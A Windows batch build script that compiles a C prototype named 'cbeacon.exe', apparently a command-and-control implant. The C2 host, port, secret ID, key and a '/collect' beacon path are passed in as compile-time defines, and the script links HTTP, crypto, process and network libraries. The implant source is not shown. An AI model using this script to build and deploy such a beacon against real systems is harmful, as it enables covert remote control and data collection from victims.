@echo off
REM build.bat — compile the C prototype with mingw-w64.
REM Usage: build.bat [C2_HOST] [C2_PORT] [SECRET_ID] [SECRET_B64]
REM Note: string -D values use backslash-escaped quotes for the Windows CRT.
set HOST=%1
if "%HOST%"=="" set HOST=127.0.0.1
set PORT=%2
if "%PORT%"=="" set PORT=8000
set SID=%3
set SKEY=%4
where x86_64-w64-mingw32-gcc >nul 2>&1
if %ERRORLEVEL%==0 ( set CC=x86_64-w64-mingw32-gcc ) else ( set CC=gcc )
%CC% -O2 -Wall -o cbeacon.exe beacon.c crypto_cng.c curve25519.c -lwinhttp -lbcrypt -lpsapi -liphlpapi ^
  -DC2_HOST=\"%HOST%\" -DC2_PORT=%PORT% -DBEACON_PATH=\"/collect\" ^
  -DSECRET_ID=\"%SID%\" -DSECRET_B64=\"%SKEY%\"
if %ERRORLEVEL%==0 ( echo built cbeacon.exe & dir cbeacon.exe ) else ( echo BUILD FAILED & exit /b 1 )
